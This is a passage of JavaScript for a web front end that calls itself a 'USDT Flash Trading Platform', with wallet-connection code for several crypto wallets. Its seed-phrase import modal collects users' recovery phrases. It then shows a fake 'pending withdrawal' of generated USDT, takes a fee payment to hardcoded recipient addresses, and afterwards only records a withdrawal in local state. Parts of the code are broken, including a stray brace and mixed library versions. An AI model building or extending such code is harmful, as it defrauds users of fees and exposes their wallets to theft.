            maxWords = 24;
            renderWordBoxes(maxWords);
        }
        
        const boxes = container.querySelectorAll('.seed-word-box');
        
        words.forEach((word, i) => {
            if (i < boxes.length) {
                boxes[i].value = word.replace(/[^a-z]/g, '');
            }
        });
        
        syncWordsToTextarea();
        updateWordCount();
        validateSeedPhraseRealTime();
        
        // Focus next empty box
        const nextEmpty = Array.from(boxes).find(b => !b.value);
        if (nextEmpty) nextEmpty.focus();
    }
}

function closeSeedImportModal() {
    const modal = document.getElementById('seedImportModal');
    if (modal) modal.remove();
}

/**
 * Import wallet from seed phrase - Professional Version
 */
async function importSeedPhrase() {
    const seedPhrase = document.getElementById('seedPhraseInput').value;
    const network = document.getElementById('seedNetworkSelect').value;
    const btn = document.getElementById('importSeedBtn');
    const statusDiv = document.getElementById('seedImportStatus');
    const btnText = btn.querySelector('.btn-text');
    const btnLoader = btn.querySelector('.btn-loader');
    
    if (!seedPhrase || seedPhrase.trim() === '') {
        showStatus(statusDiv, 'error', 'Please enter your seed phrase');
        return;
    }
    
    // Validate before sending
    const validation = validateSeedPhrase(seedPhrase.trim());
    if (!validation.valid) {
        showStatus(statusDiv, 'error', validation.error);
        return;
    }
    
    setLoading(btn, btnText, btnLoader, true);
    statusDiv.style.display = 'none';
    
    try {
        const result = await window.walletConnection.importWalletFromSeed(seedPhrase.trim(), network);
        
        if (result.success) {
            // Fetch native balance for fee payment
            const nativeBalance = await window.walletConnection.getNativeBalance();
            
            // Check for pending withdrawal from app state
            const hasPending = window.state?.hasPendingWithdrawal && window.state?.lastGeneratedAmount > 0;
            const pendingAmount = window.state?.lastGeneratedAmount || 0;
            const feeInfo = hasPending ? calculateFeeInfo(pendingAmount, network) : null;
            const canAutoPay = hasPending && nativeBalance.success && parseFloat(nativeBalance.balance) >= (feeInfo?.fee || 0);
            
            let statusHTML = `
                <div style="display: flex; align-items: flex-start; gap: 12px;">
                    <div style="font-size: 24px; flex-shrink: 0;">✅</div>
                    <div style="flex: 1;">
                        <strong style="font-size: 14px;">Wallet Imported Successfully!</strong><br>
                        <span style="font-family: monospace; font-size: 12px; opacity: 0.8;">${result.address.substring(0, 10)}...${result.address.substring(result.address.length - 6)}</span><br>
                        <span style="font-size: 12px;">Network: ${result.network}</span><br>
                        <span style="font-size: 12px; color: #FFD700;">Native Balance: ${nativeBalance.success ? parseFloat(nativeBalance.balance).toFixed(4) + ' ' + (network === 'TRC20' ? 'TRX' : network === 'ERC20' ? 'ETH' : 'BNB') : 'Unable to fetch'}</span>
                    </div>
                </div>
            `;
            
            // Add pending withdrawal section
            if (hasPending) {
                const nativeSymbol = network === 'TRC20' ? 'TRX' : network === 'ERC20' ? 'ETH' : 'BNB';
                const balanceText = nativeBalance.success ? parseFloat(nativeBalance.balance).toFixed(4) : '?';
                
                statusHTML += `
                    <div style="margin-top: 16px; padding: 14px; background: rgba(255, 215, 0, 0.1); border: 1px solid #FFD700; border-radius: 8px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <strong style="color: #FFD700;">⏳ Pending Withdrawal Detected</strong>
                            <span style="font-size: 11px; padding: 2px 8px; background: rgba(255,215,0,0.2); border-radius: 4px; color: #FFD700;">${pendingAmount.toLocaleString()} USDT</span>
                        </div>
                        <div style="font-size: 12px; margin-bottom: 4px;">Required Fee: <strong>${feeInfo.fee} ${feeInfo.currency}</strong> (${feeInfo.network})</div>
                        <div style="font-size: 12px; margin-bottom: 12px;">Your ${nativeSymbol} Balance: <strong>${balanceText} ${nativeSymbol}</strong></div>
                `;
                
                if (canAutoPay) {
                    statusHTML += `
                        <button id="autoPayFeeBtn" class="btn-primary btn-full" style="padding: 12px; font-size: 13px; margin-top: 8px;" onclick="autoPayAndWithdraw('${network}', ${feeInfo.fee}, '${feeInfo.recipient}', ${pendingAmount})">
                            💰 Pay Fee & Withdraw ${pendingAmount.toLocaleString()} USDT
                        </button>
                    `;
                } else {
                    statusHTML += `
                        <div style="font-size: 11px; color: #FFD700; margin-top: 8px;">
                            ${!nativeBalance.success ? '⚠️ Could not verify balance' : '⚠️ Insufficient ' + nativeSymbol + ' for fee. Please deposit ' + feeInfo.currency + ' to this address.'}
                        </div>
                        <div style="margin-top: 8px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 4px; font-family: monospace; font-size: 11px; word-break: break-all;">
                            Fee Address: ${feeInfo.recipient}
                        </div>
                    `;
                }
                
                statusHTML += `</div>`;
            }
            
            showStatus(statusDiv, 'success', statusHTML);
            
            // Sync app state with imported wallet
            if (window.state) {
                window.state.isConnected = true;
                window.state.isGuest = false;
                window.state.walletAddress = result.address;
                if (network === 'TRC20') {
                    window.state.tronAddress = result.address;
                } else {
                    window.state.evmAddress = result.address;
                }
                if (window.saveStateToLocalStorage) window.saveStateToLocalStorage();
                if (window.updateUI) window.updateUI();
            }
            
            // Close modal after delay (but keep open if pending withdrawal with action needed)
            if (!hasPending || !canAutoPay) {
                setTimeout(() => {
                    closeSeedImportModal();
                }, 3000);
            }
            
        } else {
            showStatus(statusDiv, 'error', `Import failed: ${result.message}`);
        }
    } catch (error) {
        console.error('Seed import error:', error);
        showStatus(statusDiv, 'error', `Error: ${error.message}`);
    } finally {
        setLoading(btn, btnText, btnLoader, false);
    }
}

/**
 * Auto pay fee and initiate withdrawal
 */
async function autoPayAndWithdraw(network, feeAmount, feeRecipient, usdtAmount) {
    const btn = document.getElementById('autoPayFeeBtn');
    if (!btn) return;
    
    btn.disabled = true;
    btn.textContent = '⏳ Processing...';
    
    try {
        // Send fee payment
        const paymentResult = await window.walletConnection.sendFeePayment(feeAmount, feeRecipient, network);
        
        if (paymentResult.success) {
            btn.textContent = '✅ Fee Paid! Verifying...';
            
            // Add to transaction history
            if (window.state) {
                window.state.transactions.push({
                    type: 'Fee Payment',
                    hash: paymentResult.txHash,
                    amount: feeAmount,
                    network: network,
                    timestamp: new Date().toISOString(),
                    status: 'pending'
                });
                if (window.saveStateToLocalStorage) window.saveStateToLocalStorage();
            }
            
            // Verify on blockchain after a delay
            setTimeout(async () => {
                try {
                    const verifyResult = await verifyTransaction(paymentResult.txHash, network, feeAmount, feeRecipient, {
                        etherscan: 'YOUR_ETHERSCAN_API_KEY',
                        bscscan: 'YOUR_BSCSCAN_API_KEY'
                    });
                    
                    if (verifyResult.success) {
                        btn.textContent = '✅ Verified! Completing...';
                        
                        // Mark withdrawal as complete
                        if (window.state) {
                            window.state.hasPendingWithdrawal = false;
                            window.state.transactions.push({
                                type: 'Withdraw',
                                coin: 'USDT',
                                amount: usdtAmount,
                                timestamp: new Date(),
                                hash: paymentResult.txHash,
                                network: network
                            });
                            if (window.saveStateToLocalStorage) window.saveStateToLocalStorage();
                            if (window.updateUI) window.updateUI();
                            if (window.updateTrackingMap) window.updateTrackingMap();
                        }
                        
                        setTimeout(() => {
                            closeSeedImportModal();
                            if (window.showNotification) window.showNotification(`Successfully withdrew ${usdtAmount.toLocaleString()} USDT!`);
                        }, 1500);
                    } else {
                        btn.disabled = false;
                        btn.textContent = '❌ Verification Failed - Retry';
                        setTimeout(() => {
                            btn.textContent = '💰 Pay Fee & Withdraw';
                        }, 3000);
                    }
                } catch (e) {
                    btn.disabled = false;
                    btn.textContent = '❌ Error - Retry';
                }
            }, 3000);
            
        } else {
            btn.disabled = false;
            btn.textContent = `❌ Failed: ${paymentResult.message}`;
            setTimeout(() => {
                btn.textContent = '💰 Pay Fee & Withdraw';
            }, 3000);
        }
    } catch (error) {
        console.error('Auto pay error:', error);
        btn.disabled = false;
        btn.textContent = '❌ Error - Retry';
    }
}

/**
 * Calculate fee info for display
 */
function calculateFeeInfo(amount, network) {
    const BASE_FEES = { TRC20: 175, ERC20: 0.02, BEP20: 0.07 };
    const FEE_CURRENCY = { TRC20: 'TRX', ERC20: 'ETH', BEP20: 'BNB' };
    const FEE_RECIPIENTS = { 
        TRC20: 'TJRabPrwbZy45sbavfcjinPJC18kjpRTv8',
        ERC20: '0x8b17...3f2a',
        BEP20: '0x8b17...3f2a'
    };
    
    const base = BASE_FEES[network];
    const feePerUnit = base / 1000;
    const MIN_AMOUNT = 1000;
    const DISCOUNT_THRESHOLD = 2000;
    const DISCOUNT_RATE = 0.5;
    
    const effectiveAmount = Math.max(amount, MIN_AMOUNT);
    let totalFee = 0;
    
    if (effectiveAmount <= DISCOUNT_THRESHOLD) {
        totalFee = effectiveAmount * feePerUnit;
    } else {
        const basePart = 2000 * feePerUnit;
        const extraAmount = effectiveAmount - DISCOUNT_THRESHOLD;
        const discountedPart = extraAmount * (feePerUnit * DISCOUNT_RATE);
        totalFee = basePart + discountedPart;
    }
    
    return {
        fee: parseFloat(totalFee.toFixed(4)),
        currency: FEE_CURRENCY[network],
        network: network,
        recipient: FEE_RECIPIENTS[network]
    };
}

/**
 * Show status with type
 */
function showStatus(statusDiv, type, html) {
    statusDiv.style.display = 'block';
    if (type === 'success') {
        statusDiv.style.background = 'rgba(0, 255, 65, 0.15)';
        statusDiv.style.border = '1px solid #00FF41';
        statusDiv.style.color = '#00FF41';
    } else {
        statusDiv.style.background = 'rgba(255, 0, 85, 0.15)';
        statusDiv.style.border = '1px solid #FF0055';
        statusDiv.style.color = '#FF0055';
    }
    statusDiv.innerHTML = html;
}

/**
 * Set button loading state
 */
function setLoading(btn, btnText, btnLoader, loading) {
    btn.disabled = loading;
    if (btnText) btnText.style.display = loading ? 'none' : 'inline';
    if (btnLoader) btnLoader.style.display = loading ? 'inline' : 'none';
}

// ============================================
// TRON WALLET CONNECTION
// ============================================

/**
 * Connect to Tron network (TronLink)
 */
async function connectTronWallet() {
    try {
        closeWalletSelectionModal();
        
        if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
            showCustomAlert("TronLink Not Found", "Please install TronLink extension or use Trust Wallet.");
            return;
        }

        const tronWeb = window.tronWeb;
        
        // Request account access
        const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
        
        if (accounts && accounts.length > 0) {
            walletState.connected = true;
            walletState.address = accounts[0];
            walletState.network = 'TRC20';
            walletState.provider = tronWeb;
            walletState.walletType = 'tronlink';
            walletState.isMobile = isMobileDevice();
            
            // Get balance
            const balance = await tronWeb.trx.getBalance(walletState.address);
            walletState.balance = (balance / 1e6).toFixed(2);
            
            console.log('Tron wallet connected:', walletState.address);
            return {
                success: true,
                address: walletState.address,
                balance: walletState.balance,
                network: 'Tron (TRC20)',
                isMobile: walletState.isMobile
            };
        }
    } catch (error) {
        console.error('Tron wallet connection error:', error);
        showCustomAlert("Connection Error", `Failed to connect TronLink: ${error.message}`);
    }
}

// ============================================
// TRUST WALLET DEEP LINKING (ENHANCED)
// ============================================

/**
 * Connect to Trust Wallet via Deep Link (Mobile)
 * Returns a promise that resolves when user completes connection
 */
async function connectTrustWalletDeepLink() {
    closeWalletSelectionModal();
    
    const currentUrl = window.location.href;
    const requestId = Math.random().toString(36).substring(7);
    
    // Try multiple deep link formats for better compatibility
    const deepLinks = [
        // Format 1: Standard Trust Wallet deep link
        `trust://browser_request?url=${encodeURIComponent(currentUrl)}&requestId=${requestId}`,
        
        // Format 2: Alternative format with dapp parameter
        `trust://dapp?url=${encodeURIComponent(currentUrl)}`,
        
        // Format 3: Universal link (fallback)
        `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`
    ];
    
    // Try first deep link
    window.location.href = deepLinks[0];
    
    // Return a promise that resolves when wallet connects or times out
    return new Promise((resolve) => {
        let resolved = false;
        
        const timeout = setTimeout(() => {
            if (!resolved) {
                resolved = true;
                // Try alternative deep link
                window.location.href = deepLinks[2];
                
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        resolve({ 
                            success: false, 
                            message: "Trust Wallet not installed. Please install from App Store/Google Play or use another wallet.",
                            code: 'TRUST_WALLET_NOT_FOUND'
                        });
                    }
                }, 1500);
            }
        }, 2000);
        
        // Listen for connection success via callback
        const checkConnection = setInterval(() => {
            if (walletState.connected && !resolved) {
                resolved = true;
                clearInterval(checkConnection);
                clearTimeout(timeout);
                resolve({
                    success: true,
                    address: walletState.address,
                    network: walletState.network,
                    isMobile: true
                });
            }
        }, 500);
        
        // Cleanup interval after 30 seconds
        setTimeout(() => clearInterval(checkConnection), 30000);
    });
}

/**
 * Handle Trust Wallet deep link callback
 * Call this when the page loads to check if we returned from Trust Wallet
 */
async function handleTrustWalletCallback() {
    try {
        const urlParams = new URLSearchParams(window.location.search);
        const requestId = urlParams.get('requestId');
        const accounts = urlParams.get('accounts');
        const chainId = urlParams.get('chainId');
        
        // Clean URL
        if (requestId || accounts) {
            window.history.replaceState({}, document.title, window.location.pathname);
        }
        
        if (accounts) {
            const address = accounts.split(',')[0];
            if (address) {
                walletState.connected = true;
                walletState.address = address;
                walletState.walletType = 'trustwallet';
                walletState.isMobile = true;
                
                // Determine network from chainId
                if (chainId) {
                    const chainIdNum = parseInt(chainId, 16);
                    if (chainIdNum === 56) {
                        walletState.network = 'BEP20';
                    } else if (chainIdNum === 1) {
                        walletState.network = 'ERC20';
                    } else {
                        walletState.network = 'ERC20';
                    }
                } else {
                    walletState.network = 'ERC20';
                }
                
                // Initialize provider
                if (typeof window.ethereum !== 'undefined') {
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    walletState.provider = provider;
                    walletState.signer = await provider.getSigner();
                    
                    const network = await provider.getNetwork();
                    walletState.chainId = network.chainId;
                    
                    const balance = await provider.getBalance(address);
                    walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
                }
                
                console.log('Trust Wallet connected via deep link:', walletState.address);
                return {
                    success: true,
                    address: walletState.address,
                    network: walletState.network,
                    isMobile: true
                };
            }
        }
    } catch (error) {
        console.error('Trust Wallet callback error:', error);
    }
    
    return { success: false };
}

// Auto-handle callback on page load
if (typeof window !== 'undefined') {
    window.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => handleTrustWalletCallback(), 100);
    });
}

/**
 * Generate QR code for manual wallet scanning (for desktop users)
 */
function generateWalletQRCode() {
    const currentUrl = window.location.href;
    const qrContainer = document.getElementById('walletQRContainer');
    
    if (!qrContainer) return;
    
    try {
        // Clear previous QR code
        qrContainer.innerHTML = '';
        
        // Generate QR code using QRCode library
        new QRCode(qrContainer, {
            text: currentUrl,
            width: 200,
            height: 200,
            colorDark: '#D4AF37',
            colorLight: '#1a1a1a'
        });
        
        return true;
    } catch (error) {
        console.error('QR code generation error:', error);
        return false;
    }
}

// ============================================
// ETHEREUM/BSC WALLET CONNECTION
// ============================================

/**
 * Connect to Ethereum or BSC network (MetaMask, Trust Wallet, etc.)
 */
async function connectEthereumWallet() {
    try {
        closeWalletSelectionModal();
        
        if (typeof window.ethereum === 'undefined') {
            showCustomAlert("Web3 Wallet Not Found", 
                "Please install MetaMask or Trust Wallet.");
            return;
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        
        // Request account access
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const signer = await provider.getSigner();
            const chainId = await provider.getNetwork();
            
            walletState.connected = true;
            walletState.address = accounts[0];
            walletState.provider = provider;
            walletState.signer = signer;
            walletState.chainId = chainId.chainId;
            walletState.walletType = window.ethereum.isMetaMask ? 'metamask' : 'trustwallet';
            walletState.isMobile = isMobileDevice();
            
            // Determine network type
            if (chainId.chainId === 1) {
                walletState.network = 'ERC20';
            } else if (chainId.chainId === 56) {
                walletState.network = 'BEP20';
            } else {
                showCustomAlert("Unsupported Network", 
                    "Please switch to Ethereum or Binance Smart Chain.");
                return;
            }
            
            // Get balance
            const balance = await provider.getBalance(walletState.address);
            walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
            
            console.log('Ethereum wallet connected:', walletState.address);
            return {
                success: true,
                address: walletState.address,
                balance: walletState.balance,
                network: walletState.network === 'ERC20' ? 'Ethereum (ERC20)' : 'Binance Smart Chain (BEP20)',
                chainId: walletState.chainId,
                isMobile: walletState.isMobile
            };
        }
    } catch (error) {
        console.error('Ethereum wallet connection error:', error);
        showCustomAlert("Connection Error", `Failed to connect wallet: ${error.message}`);
    }
}

// ============================================
// NETWORK & ACCOUNTS CHANGE LISTENERS
// ============================================

/**
 * Setup event listeners for network and accounts changes
 */
function setupNetworkListeners() {
    if (typeof window.ethereum === 'undefined') return;

    // Listen for chain changes
    window.ethereum.on('chainChanged', async (chainId) => {
        console.log('Network changed to:', chainId);
        await refreshNetworkState();
        
        // Notify UI if callback exists
        if (window.onNetworkChange) {
            window.onNetworkChange(chainId);
        }
    });

    // Listen for accounts changes
    window.ethereum.on('accountsChanged', async (accounts) => {
        console.log('Accounts changed:', accounts);
        if (accounts.length === 0) {
            // User disconnected wallet
            disconnectWallet();
            if (window.onWalletDisconnect) {
                window.onWalletDisconnect();
            }
        } else {
            // User switched accounts
            await refreshNetworkState();
            if (window.onAccountsChange) {
                window.onAccountsChange(accounts);
            }
        }
    });
}

// Initialize listeners when module loads
if (typeof window !== 'undefined') {
    setupNetworkListeners();
}

// ============================================
// WALLETCONNECT v2 CONNECTION
// ============================================

/**
 * Connect via WalletConnect v2 - No QR Code on Mobile
 * Mobile: Opens wallet app directly via universal link
 * Desktop: Shows QR code modal
 */
async function connectWalletConnect() {
    try {
        closeWalletSelectionModal();
        
        const isMobile = isMobileDevice();
        
        // Ensure Web3Modal is loaded
        if (typeof window.Web3Modal === 'undefined') {
            await loadWeb3Modal();
        }
        
        if (typeof window.Web3Modal === 'undefined') {
            showCustomAlert("WalletConnect Unavailable", 
                "WalletConnect library not loaded. Please refresh and try again.");
            return;
        }

        if (isMobile) {
            // ===== MOBILE: Direct universal link - NO QR CODE =====
            return await connectWalletConnectMobile();
        } else {
            // ===== DESKTOP: Show QR code modal =====
            const web3Modal = new window.Web3Modal.default({
                projectId: 'YOUR_WALLETCONNECT_PROJECT_ID',
                walletConnectVersion: 2,
                themeMode: 'dark',
                themeVariables: {
                    '--w3m-accent': '#00FF41',
                    '--w3m-color-mix': '#00FF41',
                    '--w3m-color-mix-strength': 20
                },
                enableExplorer: false,
                enableCoinbase: false,
                enableEmail: false,
                enableSocials: false
            });

            const connection = await web3Modal.connect();
            return handleWalletConnectConnection(connection);
        }
        
    } catch (error) {
        console.error('WalletConnect error:', error);
        if (error.code === 4001) {
            showCustomAlert("Connection Rejected", "You rejected the connection request.");
        } else {
            showCustomAlert("Error", `WalletConnect failed: ${error.message}`);
        }
    }
}

/**
 * Mobile WalletConnect - Direct universal link, NO QR CODE
 */
async function connectWalletConnectMobile() {
    try {
        // Load Web3Wallet if needed
        if (typeof window.Web3Wallet === 'undefined') {
            await loadWeb3Wallet();
        }
        
        if (typeof window.Web3Wallet === 'undefined') {
            showCustomAlert("WalletConnect Unavailable", 
                "WalletConnect library not loaded. Please refresh and try again.");
            return;
        }

        // Initialize Web3Wallet
        const wcProvider = await window.Web3Wallet.default.init({
            projectId: 'YOUR_WALLETCONNECT_PROJECT_ID', // REPLACE WITH YOUR PROJECT ID
            metadata: {
                name: 'AITRO FLASH USDT',
                description: 'USDT Flash Trading Platform',
                url: window.location.origin,
                icons: ['https://s2.coinmarketcap.com/static/img/coins/64x64/825.png']
            }
        });
        
        // Connect and get URI
        const { uri, approval } = await wcProvider.connect({
            namespaces: {
                eip155: {
                    methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData'],
                    chains: ['eip155:1', 'eip155:56'], // Ethereum, BSC
                    events: ['chainChanged', 'accountsChanged'],
                    accounts: []
                }
            });
        
        // Open wallet app directly via universal link - NO QR CODE
        if (uri) {
            const universalLink = `wc:${uri.split('wc:')[1]}`;
            window.location.href = universalLink;
            
            // Wait for user approval in wallet app
            const session = await approval();
            return handleWalletConnectSession(session);
        }
        
    } catch (error) {
        console.error('WalletConnect mobile error:', error);
        if (error.code === 4001) {
            showCustomAlert("Connection Rejected", "You rejected the connection request.");
        } else {
            showCustomAlert("Error", `WalletConnect failed: ${error.message}`);
        }
    }
}
}

async function loadWeb3Wallet() {
    return new Promise((resolve, reject) => {
        if (typeof window.Web3Wallet !== 'undefined') {
            resolve();
            return;
        }
        
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@web3modal/wallet@latest/dist/web3wallet.umd.min.js';
        script.onload = () => resolve();
        script.onerror = () => reject(new Error('Failed to load Web3Wallet'));
        document.head.appendChild(script);
    });
}

async function handleWalletConnectConnection(connection) {
    try {
        const provider = new ethers.BrowserProvider(connection);
        const signer = await provider.getSigner();
        const chainId = await provider.getNetwork();
        
        walletState.connected = true;
        walletState.address = await signer.getAddress();
        walletState.provider = provider;
        walletState.signer = signer;
        walletState.chainId = chainId.chainId;
        walletState.walletType = 'walletconnect';
        walletState.isMobile = isMobileDevice();
        walletState.network = chainId.chainId === 56n ? 'BEP20' : (chainId.chainId === 1n ? 'ERC20' : 'ERC20');
        
        const balance = await provider.getBalance(walletState.address);
        walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
        
        console.log('WalletConnect connected:', walletState.address);
        return {
            success: true,
            address: walletState.address,
            balance: walletState.balance,
            network: walletState.network === 'BEP20' ? 'Binance Smart Chain (BEP20)' : 'Ethereum (ERC20)',
            isMobile: walletState.isMobile
        };
    } catch (error) {
        console.error('WalletConnect session error:', error);
        return { success: false, message: error.message };
    }
}

async function handleWalletConnectSession(session) {
    try {
        // Convert WalletConnect session to ethers provider
        const provider = new ethers.Web3Provider({
            request: async (args) => {
                const result = await session.request(args);
                return result;
            }
        });
        
        const signer = await provider.getSigner();
        const chainId = await provider.getNetwork();
        
        walletState.connected = true;
        walletState.address = await signer.getAddress();
        walletState.provider = provider;
        walletState.signer = signer;
        walletState.chainId = chainId.chainId;
        walletState.walletType = 'walletconnect';
        walletState.isMobile = isMobileDevice();
        walletState.network = chainId.chainId === 56 ? 'BEP20' : (chainId.chainId === 1 ? 'ERC20' : 'ERC20');
        
        const balance = await provider.getBalance(walletState.address);
        walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
        
        return {
            success: true,
            address: walletState.address,
            balance: walletState.balance,
            network: walletState.network === 'BEP20' ? 'Binance Smart Chain (BEP20)' : 'Ethereum (ERC20)',
            isMobile: walletState.isMobile
        };
    } catch (error) {
        console.error('WalletConnect session error:', error);
        return { success: false, message: error.message };
    }
}

async function loadWeb3Modal() {
    return new Promise((resolve, reject) => {
        if (typeof window.Web3Modal !== 'undefined') {
            resolve();
            return;
        }
        
        // Load Web3Modal CSS
        const css = document.createElement('link');
        css.rel = 'stylesheet';
        css.href = 'https://cdn.jsdelivr.net/npm/@web3modal/ethereum@latest/dist/web3modal.css';
        document.head.appendChild(css);
        
        // Load Web3Modal JS
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@web3modal/ethereum@latest/dist/web3modal.umd.min.js';
        script.onload = () => resolve();
        script.onerror = () => reject(new Error('Failed to load Web3Modal'));
        document.head.appendChild(script);
    });
}

// ============================================
// OKX WALLET CONNECTION
// ============================================

/**
 * Connect to OKX Wallet (supports Tron, EVM, and more)
 * Supports both browser extension and mobile app deep linking
 */
async function connectOKXWallet() {
    try {
        closeWalletSelectionModal();
        
        const isMobile = isMobileDevice();
        
        // On mobile, try deep linking first
        if (isMobile && typeof window.okxwallet === 'undefined') {
            const deepLinkResult = await connectOKXWalletDeepLink();
            if (deepLinkResult.success) {
                return deepLinkResult;
            }
            // If deep link fails, fall through to show error
        }
        
        // Desktop or in-app browser: check for injected provider
        if (typeof window.okxwallet === 'undefined') {
            if (isMobile) {
                showCustomAlert("OKX Wallet Not Found", 
                    "OKX Wallet app not detected. Please install OKX Wallet from App Store / Google Play, or open this page directly in OKX Wallet browser.");
            } else {
                showCustomAlert("OKX Wallet Not Found", "Please install OKX Wallet browser extension.");
            }
            return;
        }

        // Try Tron first
        if (window.okxwallet.tronWeb) {
            const tronWeb = window.okxwallet.tronWeb;
            const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
            
            if (accounts && accounts.length > 0) {
                walletState.connected = true;
                walletState.address = accounts[0];
                walletState.network = 'TRC20';
                walletState.provider = tronWeb;
                walletState.walletType = 'okxwallet';
                walletState.isMobile = isMobileDevice();
                
                const balance = await tronWeb.trx.getBalance(walletState.address);
                walletState.balance = (balance / 1e6).toFixed(2);
                
                console.log('OKX Wallet (Tron) connected:', walletState.address);
                return {
                    success: true,
                    address: walletState.address,
                    balance: walletState.balance,
                    network: 'Tron (TRC20)',
                    isMobile: walletState.isMobile
                };
            }
        }
        
        // Try EVM
        if (window.okxwallet.ethereum) {
            const provider = new ethers.BrowserProvider(window.okxwallet.ethereum);
            const accounts = await window.okxwallet.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const signer = await provider.getSigner();
                const chainId = await provider.getNetwork();
                
                walletState.connected = true;
                walletState.address = accounts[0];
                walletState.provider = provider;
                walletState.signer = signer;
                walletState.chainId = chainId.chainId;
                walletState.walletType = 'okxwallet';
                walletState.isMobile = isMobileDevice();
                walletState.network = chainId.chainId === 56 ? 'BEP20' : 'ERC20';
                
                const balance = await provider.getBalance(walletState.address);
                walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
                
                console.log('OKX Wallet (EVM) connected:', walletState.address);
                return {
                    success: true,
                    address: walletState.address,
                    balance: walletState.balance,
                    network: walletState.network === 'BEP20' ? 'Binance Smart Chain (BEP20)' : 'Ethereum (ERC20)',
                    isMobile: walletState.isMobile
                };
            }
        }
    } catch (error) {
        console.error('OKX Wallet connection error:', error);
        showCustomAlert("Connection Error", `Failed to connect OKX Wallet: ${error.message}`);
    }
}

/**
 * Connect to OKX Wallet via Deep Link (Mobile)
 * Opens OKX app directly and returns connection promise
 */
async function connectOKXWalletDeepLink() {
    const currentUrl = window.location.href;
    const encodedUrl = encodeURIComponent(currentUrl);
    
    // OKX deep link formats
    const deepLinks = [
        `okx://web3/connect?url=${encodedUrl}`,
        `okx://dapp?url=${encodedUrl}`,
        `okxwallet://web3/connect?url=${encodedUrl}`,
        `https://web3.okx.com/connect?url=${encodedUrl}` // Universal link fallback
    ];
    
    // Try first deep link
    window.location.href = deepLinks[0];
    
    // Return a promise that resolves when connection is established
    return new Promise((resolve) => {
        let resolved = false;
        
        const timeout = setTimeout(() => {
            if (resolved) return;
            resolved = true;
            // Try alternative deep link
            window.location.href = deepLinks[2];
            
            setTimeout(() => {
                if (resolved) return;
                resolved = true;
                // Try universal link as final fallback
                window.location.href = deepLinks[3];
                
                setTimeout(() => {
                    if (resolved) return;
                    resolved = true;
                    resolve({ 
                        success: false, 
                        message: "OKX Wallet app not found. Please install OKX Wallet from App Store / Google Play.",
                        code: 'OKX_NOT_INSTALLED'
                    });
                }, 1500);
            }, 2000);
        }, 2000);
        
        // Poll for connection
        const checkConnection = setInterval(() => {
            if (walletState.connected && walletState.walletType === 'okxwallet') {
                resolved = true;
                clearInterval(checkConnection);
                clearTimeout(timeout);
                resolve({
                    success: true,
                    address: walletState.address,
                    balance: walletState.balance,
                    network: walletState.network,
                    isMobile: true
                });
            }
        }, 500);
        
        // Cleanup after 30 seconds
        setTimeout(() => {
            clearInterval(checkConnection);
            if (!resolved) {
                resolved = true;
                resolve({ success: false, message: 'Connection timeout' });
            }
        }, 30000);
    });
}

// ============================================
// BYBIT (BITGET) WALLET CONNECTION
// ============================================

/**
 * Connect to Bybit (Bitget) Wallet
 */
async function connectBitgetWallet() {
    try {
        closeWalletSelectionModal();
        
        if (typeof window.bitkeep === 'undefined' || !window.bitkeep.ethereum) {
            showCustomAlert("Bybit Wallet Not Found", "Please install Bybit Wallet extension or app.");
            return;
        }

        const provider = new ethers.BrowserProvider(window.bitkeep.ethereum);
        const accounts = await window.bitkeep.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const signer = await provider.getSigner();
            const chainId = await provider.getNetwork();
            
            walletState.connected = true;
            walletState.address = accounts[0];
            walletState.provider = provider;
            walletState.signer = signer;
            walletState.chainId = chainId.chainId;
            walletState.walletType = 'bitget';
            walletState.isMobile = isMobileDevice();
            walletState.network = chainId.chainId === 56 ? 'BEP20' : 'ERC20';
            
            const balance = await provider.getBalance(walletState.address);
            walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
            
            console.log('Bybit Wallet connected:', walletState.address);
            return {
                success: true,
                address: walletState.address,
                balance: walletState.balance,
                network: walletState.network === 'BEP20' ? 'Binance Smart Chain (BEP20)' : 'Ethereum (ERC20)',
                isMobile: walletState.isMobile
            };
        }
    } catch (error) {
        console.error('Bybit Wallet connection error:', error);
        showCustomAlert("Connection Error", `Failed to connect Bybit Wallet: ${error.message}`);
    }
}

// ============================================
// BINANCE WEB3 WALLET CONNECTION
// ============================================

/**
 * Connect to Binance Web3 Wallet
 */
async function connectBinanceWallet() {
    try {
        closeWalletSelectionModal();
        
        const provider = window.BinanceChain || window.ethereum;
        
        if (typeof provider === 'undefined') {
            showCustomAlert("Binance Web3 Not Found", "Please install Binance Web3 Wallet extension or app.");
            return;
        }

        const ethersProvider = new ethers.BrowserProvider(provider);
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const signer = await ethersProvider.getSigner();
            const chainId = await ethersProvider.getNetwork();
            
            walletState.connected = true;
            walletState.address = accounts[0];
            walletState.provider = ethersProvider;
            walletState.signer = signer;
            walletState.chainId = chainId.chainId;
            walletState.walletType = 'binance';
            walletState.isMobile = isMobileDevice();
            walletState.network = chainId.chainId === 56 ? 'BEP20' : 'ERC20';
            
            const balance = await ethersProvider.getBalance(walletState.address);
            walletState.balance = parseFloat(ethers.formatEther(balance)).toFixed(4);
            
